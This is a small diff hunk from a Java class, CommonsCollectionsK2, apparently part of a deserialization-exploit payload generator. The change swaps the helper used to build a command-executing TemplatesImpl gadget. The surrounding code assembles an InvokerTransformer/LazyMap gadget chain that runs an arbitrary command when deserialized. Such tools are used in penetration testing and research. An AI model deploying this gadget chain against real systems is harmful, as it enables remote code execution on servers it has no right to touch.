@@ -24,7 +24,7 @@ public class CommonsCollectionsK2 implements CommandObjectPayload<Map>
 
 	public Map getObject(String command) throws Exception {
 
-		Object                  templates   = Gadgets.createTemplatesImpl(command);
+		Object                  templates   = Gadgets.createTemplates4Cmd(command);
 		InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 		HashMap<String, String> innerMap    = new HashMap<String, String>();
 		LazyMap                 lazyMap     = LazyMap.lazyMap(innerMap, (Transformer) transformer);
